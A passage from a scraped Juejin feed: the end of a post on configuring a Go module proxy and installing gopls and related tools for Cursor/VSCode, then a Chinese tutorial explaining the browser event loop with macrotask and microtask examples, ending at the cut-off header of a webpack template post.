                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在后台执行：</p>
<pre><code class="hljs language-bash" lang="bash">go install golang.org/x/tools/gopls@latest
</code></pre>
<p>但 <strong>Go 默认一定会访问：</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//proxy.golang.org</span>
</code></pre>
<p>而当前网络 <strong>没有被 Go 识别</strong> → 请求超时 → 所有工具安装失败。</p>
<hr/>
<h2 data-id="heading-0">✅ 方案一（推荐）：正确配置 Go 国内镜像</h2>
<h3 data-id="heading-1">1️⃣ 配置 Go 使用国内镜像</h3>
<p>在终端执行（macOS）：</p>
<pre><code class="hljs language-bash" lang="bash">go <span class="hljs-built_in">env</span> -w GOPROXY=https://goproxy.cn,direct
</code></pre>
<p>或者（七牛代理）：</p>
<pre><code class="hljs language-bash" lang="bash">go <span class="hljs-built_in">env</span> -w GOPROXY=https://goproxy.io,direct
</code></pre>
<p>然后验证：</p>
<pre><code class="hljs language-bash" lang="bash">go <span class="hljs-built_in">env</span> GOPROXY
</code></pre>
<p>看到类似：</p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//goproxy.cn,direct</span>
</code></pre>
<p>说明成功 ✅</p>
<hr/>
<h3 data-id="heading-2">2️⃣ 重新让 Cursor/VSCode 安装工具</h3>
<p>重启 <code>Cursor/VSCode</code> 打开一个 <code>.go</code> 文件，它会自动重新尝试安装：</p>
<ul>
<li>gopls</li>
<li>staticcheck</li>
<li>goimports</li>
<li>dlv</li>
<li>gotests</li>
<li>impl</li>
</ul>
<p>👉 <strong>这一步通常就能直接成功</strong></p>
<hr/>
<h2 data-id="heading-3">✅ 方案二：自己手动装，完全可以 👍</h2>
<p>下面是 <strong>Cursor / vscode-go 默认会装的所有 Go 工具清单</strong><br/>
可以 <strong>一次性手动装完</strong></p>
<hr/>
<h3 data-id="heading-4">📦 Cursor / vscode-go 常用工具完整列表</h3>
<pre><code class="hljs language-bash" lang="bash">go install golang.org/x/tools/gopls@latest
go install golang.org/x/tools/cmd/goimports@latest
go install honnef.co/go/tools/cmd/staticcheck@latest
go install github.com/go-delve/delve/cmd/dlv@latest
go install github.com/cweill/gotests/gotests@latest
go install github.com/josharian/impl@latest
go install github.com/traefik/yaegi/cmd/yaegi@latest
</code></pre>
<blockquote>
<p>⚠️ 前提：<strong>网络已经能访问</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-5">📍 安装到哪里了？</h3>
<p>日志里已经说明：</p>
<pre><code class="hljs language-bash" lang="bash">Installing tools at /Users/dengzemiao/go/bin
</code></pre>
<p>确认 PATH 包含它：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> | grep go/bin
</code></pre>
<p>如果没有：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'export PATH=$PATH:$HOME/go/bin'</span> &gt;&gt; ~/.zshrc
<span class="hljs-built_in">source</span> ~/.zshrc
</code></pre>
<hr/>
<h3 data-id="heading-6">4️⃣ 验证是否安装成功</h3>
<pre><code class="hljs">gopls version
goimports -h
staticcheck -h
dlv version
</code></pre>
<p>只要 <strong>有输出不报错 = 成功</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手撕React18源码系列 - Event-Loop模型]]></title>    <link>https://juejin.cn/post/7584061465398689833</link>    <guid>https://juejin.cn/post/7584061465398689833</guid>    <pubDate>2025-12-16T08:01:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584061465398689833" data-draft-id="7584061465398640681" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手撕React18源码系列 - Event-Loop模型"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-16T08:01:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟西"/> <meta itemprop="url" content="https://juejin.cn/user/776713996087847"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手撕React18源码系列 - Event-Loop模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/776713996087847/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟西
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:01:19.000Z" title="Tue Dec 16 2025 08:01:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本系列从头手把手带你学习react源码。但是在深入React架构前，你必须先了解一个关键概念，<strong>Event Loop（事件循环）模型</strong>。</p>
<p>为什么要关心 Event Loop？因为 React 的 Fiber 架构正是基于它的“分片执行”能力构建的。</p>
<ul>
<li>把庞大的更新任务拆成小单元（Fiber 节点）。</li>
<li>在每个宏任务间隙（比如一次渲染后），通过 requestIdleCallback 或 scheduler 插入高优先级微任务或宏任务。</li>
<li>如果用户有交互（比如点击），浏览器会优先处理 UI 宏任务，React 主动“让出主线程”，实现可中断、可恢复、高响应的并发更新。</li>
</ul>
<blockquote>
<p>换句话说：<strong>没有 Event Loop，就没有 Concurrent Mode（并发模式）</strong> 。这里说的并发其实是 “<strong>可中断的渲染（Interruptible Rendering）</strong>” + “<strong>时间切片（Time Slicing）</strong>” 。它是一种 逻辑上的并发，之前有个面试官和我犟过这个事情，所以特地的说明一下。</p>
</blockquote>
<p>如果你已经非常熟悉事件循环机制，可以直接跳过本章——因为这里不涉及任何 React 源码。
但如果你只是听说过这个概念，或者脑子里还是一堆碎片化的理解，那这篇文章就是为你准备的。
不管是为了面试，还是为了真正搞懂 React 的底层原理，学完这篇，你都能把这些碎片拼成一张完整的拼图。对了，你还需要了解一个前置概念：Promise。
别担心，只要你用 fetch 或 axios 调用过接口，就一定接触过 Promise。
我们只需要知道它的基本机制就够了。本文主要用它来演示微任务队列的行为，因为没有比 Promise 更直观的微任务示例了。</p>
<h2 data-id="heading-1">开始</h2>
<p>一开始我听到这个东西的时候，我马上百度了一下啥是<strong>事件循环</strong>？</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2704d4a66eb34b74af52cfac8aab2a92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=Qo8PPRNxw0zxmI3tQWngoaOhtug%3D" alt="image.png" loading="lazy"/></p>
<p>以上就是我百度到的结果，“麻了”，一句人话都没有！一气之下，我直接关掉了浏览器。
但我冷静了一会儿，认真地思考了一下：不对！不能关浏览器啊。关了它，我还怎么学事件循环？
说到这里，你可能会问：事件循环和浏览器到底有什么关系？它不就是一个抽象的概念吗？
其实不然，事件循环并不是抽象的，而是一个实实在在由浏览器提供的机制。</p>
<p>众所周知，Javascript代码<strong>通常</strong>是执行在浏览器端的(我说的是通常)，我们只讨论浏览器的执行环境。言归正传，你需要在脑海里有3个概念，<strong>主线程</strong>、<strong>宏任务队列（Macro Task Queue）</strong> 和 <strong>微任务队列（Microtask Queue）</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c51cd493a7294ee982e97a4b7f8506b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=V8olhZ8L%2BfhUHZ5duKfIeS8OyyA%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">主线程</h2>
<p><strong>比方：登机口的检票员，就是拿着那个扫码枪扫码的那个人，只有一个检票员的情况</strong></p>
<p>主线程，就是浏览器里唯一执行 JavaScript 代码的线程。JavaScript 的执行是自上而下的。当遇到异步操作时，引擎不会阻塞等待，而是将对应的回调函数放入宏任务队列或微任务队列中，继续执行后续的同步代码。等到当前主线程的任务执行完毕，就会在事件循环里面取出对应的任务，然后在主线程中继续执行。</p>
<h2 data-id="heading-3">宏队列（Macro Task Queue）</h2>
<p><strong>比方：经济舱检票口的队列</strong></p>
<p>主线程用来存放<strong>异步回调函数</strong>的<strong>第一个待办清单</strong>，主线程干完手头的事后，就从这个队列拿最前面的一个任务出来执行，执行完再拿下一个，一次只拿一个，按顺序来。是的，就这么简单。</p>
<p>常见的宏任务：<code>setTimeout</code>、<code>setInterval</code>、<code>setImmediate</code>（Node）、I/O、UI 渲染等</p>
<blockquote>
<p>我看到很多文章中武断地认为：“现在没有宏队列这个概念了。”
在我看来，这是前端圈的一个“误解”。他们看到最新的 WHATWG HTML 标准 中没有 “macro task” 这一术语，就以为这个概念被废弃了。
但事实是：规范中从来就没有正式定义过 “macro task”。“宏任务” 是社区为了与“微任务”（microtask）对比而约定俗成的说法。
只不过，现代规范对异步任务的分类和调度机制有了更精细的描述。
在广义的 JavaScript 异步模型中，“宏任务”这一说法依然广泛使用；
而在 HTML 标准中，浏览器通过多个特定类型的任务队列（如延时队列、用户交互队列等）来管理这些任务，从而更精细地控制优先级，保障用户交互的流畅性。</p>
</blockquote>
<h2 data-id="heading-4">微队列（Microtask Queue）</h2>
<p><strong>比方：头等舱检票口的队列，坐过飞机的都知道，只要头等舱队伍有一个人在排队，那么检票员就会把当前经济舱正在检的票检完。然后立刻来头等舱队伍检票，然后直到把这个队伍清空，才会回到经济舱队列。</strong></p>
<p>主线程用来存放<strong>异步回调函数</strong>的<strong>第二个待办清单</strong>，只不过，这个队列是个<strong>VIP队列</strong>，有些特权。当主线执行完宏队列里面当前的宏任务的时候，就程立刻、马上、一口气把微队列里所有的任务全执行完毕。说白了就是能插队。</p>
<p>常见的微任务：<code>Promise.then/catch/finally</code>、<code>queueMicrotask</code>、<code>MutationObserver</code>（浏览器）、<code>process.nextTick</code>（Node，优先级更高）</p>
<h2 data-id="heading-5">开始执行JS脚本</h2>
<p>这个概念我看了很多的文章，没有一个能解释的通俗易懂，各种术语，概念。在我看来，我们写的JS代码，比如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&amp;#<span class="hljs-number">34</span>;hello word&amp;#<span class="hljs-number">34</span>;)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&amp;#<span class="hljs-number">34</span>;hello word1&amp;#<span class="hljs-number">34</span>;)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&amp;#<span class="hljs-number">34</span>;hello word2&amp;#<span class="hljs-number">34</span>;)
</code></pre>
<p>这个代码就是第一个脚本代码，就是我们实实在在写在JS文件里面的代码。开程序开始执行的时候，就把这3行代码，放在了宏队列中，然后这三行代码就是第一个宏任务，所以总结一下三点！</p>
<ul>
<li>程序启动 = 执行第一个宏任务</li>
<li>微任务只能是“执行过程中产生的副产品”</li>
<li>所以，永远不可能一上来就跑微任务</li>
</ul>
<h2 data-id="heading-6">可视化这两个队列</h2>
<p>通过代码的方式直观的感受 -&gt; <strong>MicroTask</strong> | <strong>MacroTask</strong></p>
<h3 data-id="heading-7">1.执行脚本中只写了宏任务注册</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线开始)

<span class="hljs-comment">// 宏任务 1 (积压在后面)</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'宏1执行'</span>), <span class="hljs-number">0</span>);

<span class="hljs-comment">// 宏任务 2 (积压在后面)</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">console</span>(<span class="hljs-string">'宏2执行'</span>), <span class="hljs-number">0</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线结束)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45faa98795b44827a5447a93866384c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=TcR5%2FRRSSSKiQXfO5OZ%2BueSlNNU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">2.执行脚本中只写了微任务注册</h3>
<p>此时只有微队列有任务<strong>Micro=[微1，微2]</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线开始)

<span class="hljs-comment">// 微任务 1 (积压在后面)</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'微1执行'</span>)})

<span class="hljs-comment">// 微任务 2 (积压在后面)</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'微2执行'</span>)})

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线结束)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d84f6c15f4c8401b800c0f486db73965~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=1%2BKqQBe1zZb4GrKaixPVWfR9D1s%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">3.执行脚本中写了宏任务注册同时写写了微任务注册</h3>
<p>此时两个队列现在都有了任务<strong>Micro=[微1]</strong> / <strong>Macro=[宏1]</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线开始)
<span class="hljs-comment">// 宏任务 1</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'宏1'</span>), <span class="hljs-number">0</span>);
<span class="hljs-comment">// 微任务 1</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'微1执行'</span>)})

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线结束)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a9502f15b124e4297c1027d0631f1e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=qOgQo8Kdb5HX95JYdd8UXScRM1Q%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">4.执行脚本中写了宏任务但其中包含了微任务</h3>
<p>此时只有一个宏队列有了任务<strong>Macro=[宏1]</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线开始)
<span class="hljs-comment">// 宏任务 1</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 微任务 1</span>
    <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'微1执行'</span>))
}, <span class="hljs-number">0</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线结束)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01117c2607874f948096be38ec00f24b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=uCpuA84HVHqvNQp3WmXLFJyy2ik%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-11">5.执行脚本中写了微任务但其中包含了宏任务</h3>
<p>此时只有一个微队列有了任务<strong>Micro=[微1]</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线开始)
<span class="hljs-comment">// 宏任务 1</span>
<span class="hljs-keyword">const</span> A = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'宏任务(2s)'</span>); 
        <span class="hljs-title function_">r</span>(<span class="hljs-string">'success1'</span>)
    }, <span class="hljs-number">2000</span>)
})

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(主线结束)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb68d97407484dbda3bb2bf14c7d272d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Of6KW_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476879&amp;x-signature=nHLw0kMnnGIQbuMueKne22IRSTU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-12">总结</h2>
<p>到目前为止，我们已经把浏览器中的 事件循环（Event Loop）模型 拆解成了三个核心角色：</p>
<ul>
<li>主线程：唯一的 JavaScript 执行通道，像登机口那个孤独但高效的检票员；</li>
<li>宏任务队列（Macro Task Queue）：普通乘客排队区，任务按顺序一个个执行；</li>
<li>微任务队列（Microtask Queue）：头等舱 VIP 通道，一旦有任务，主线程必须立刻清空整个队列才能干别的。</li>
</ul>
<p>现在，当你再看到满屏的 <code>setTimeout</code> 和 <code>Promise.then</code>，是不是脑子里自动浮现出两个队伍在登机口排队的画面了？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[现代webpack/react/typescript/pnpm项目模板，从零到一搭建webpack项目]]></title>    <link>https://juejin.cn/post/7584059298696626217</link>    <guid>https://juejin.cn/post/7584059298696626217</guid>    <pubDate>2025-12-16T08:22:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584059298696626217" data-draft-id="7584203412197474330" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="现代webpack/react/typescript/pnpm项目模板，从零到一搭建webpack项目"/> <meta itemprop="keywords" content="Webpack,前端工程化"/> <meta itemprop="datePublished" content="2025-12-16T08:22:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="冬阳春晖"/> <meta itemprop="url" content="https://juejin.cn/user/4398478256780440"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 